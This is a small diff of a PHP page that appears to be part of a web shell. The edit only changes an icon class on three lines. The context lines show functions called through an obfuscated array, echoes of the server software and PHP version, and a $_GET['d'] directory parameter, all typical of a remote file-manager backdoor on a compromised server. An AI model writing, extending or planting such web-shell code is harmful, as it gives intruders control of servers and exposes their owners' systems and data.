@@ -70,16 +70,16 @@ for($i=0;$i<$___;$i++) {
 
 			<article>
 				<div class="i">
-					<i class="far fa-ravelry"></i>
+					<i class="far fa-laptop-code"></i>
 					<?php echo $GNJ[0]();?>
 
 					<br />
 
-					<i class="far fa-ravelry"></i> &thinsp;&thinsp;<b>SOFT  :</b> <?php echo $_SERVER['SERVER_SOFTWARE'];?> <b>PHP :</b> <?php echo $GNJ[1]();?>
+					<i class="far fa-laptop-code"></i> &thinsp;&thinsp;<b>SOFT  :</b> <?php echo $_SERVER['SERVER_SOFTWARE'];?> <b>PHP :</b> <?php echo $GNJ[1]();?>
 
 					<br />
 
-					<i class="far fa-ravelry"></i>
+					<i class="far fa-laptop-code"></i>
 					
 					<?php
 					if(isset($_GET["d"])) {
